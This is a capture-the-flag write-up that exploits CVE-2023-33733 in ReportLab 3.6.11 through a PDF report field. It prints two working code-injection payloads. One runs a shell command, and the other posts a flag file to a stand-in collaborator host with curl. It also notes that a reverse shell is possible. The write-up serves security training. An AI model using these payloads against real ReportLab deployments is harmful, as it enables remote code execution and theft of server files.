# BharatPatholabs-Access 
# Author: [Shlok](https://github.com/pphreak-1001)
## Goal
Exploit the vulnerable version of Reportlab library being used in the application.

## Vulnerabilities

- Access /robots.txt 
```
# robots.txt
User-agent: *
Allow: /

#requirements
#Flask==2.3.2
#Flask-Bcrypt==1.0.1
#reportlab==3.6.11
```
- Google reportlab==3.6.11 exploit, you will land at: https://arcticwolf.com/resources/blog/cve-2023-33733-rce-vulnerability-in-reportlab-pdf-toolkit/
, https://github.com/c53elyas/CVE-2023-33733

## Solution

- Create a report and add the payload in the report description feature or final result section as:

```
<font color="[[[getattr(pow, Word('__globals__'))['os'].system('touch /tmp/exploited') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
                exploit
</font>
```

I used some regex to restrict other commands but that was actually easily bypassable. 
You can even get a reverse shell on this application. The intended solution was to fetch the content of /var/flag/flag.txt and send it to your server.

```
<font color="[[[getattr(pow, Word('__globals__'))['os'].system('curl --data @/var/flag/flag.txt -X POST burpcollaburl') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
                exploit
</font>
```
